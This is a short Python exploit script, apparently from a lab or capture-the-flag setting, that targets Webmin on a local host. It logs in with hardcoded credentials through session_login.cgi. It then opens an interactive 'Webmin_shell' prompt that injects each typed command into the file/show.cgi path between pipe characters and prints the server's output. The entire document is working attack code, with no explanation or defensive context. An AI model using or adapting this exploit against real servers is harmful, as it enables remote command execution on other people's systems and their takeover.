#!/usr/bin/python3
import requests
import random
import string

RHOST = "127.0.0.1"
RPORT = "9000"
Username = "agent47"
Password = "videogamer124"

def rand_text(n):
	return "".join(random.choices(string.ascii_letters+string.digits, k=n))

payload = {
	'page': '%2F',
	'user': Username,
	'pass': Password
}


with requests.Session() as s:
	s.get(f'http://{RHOST}:{RPORT}')
	s.post(f'http://{RHOST}:{RPORT}/session_login.cgi', data = payload)

	while True:
		cmd = input("Webmin_shell >> ")
		uri = f'http://{RHOST}:{RPORT}/file/show.cgi/bin/{rand_text(5)}|{cmd}|'
		# print(uri)
		print(s.get(uri).text)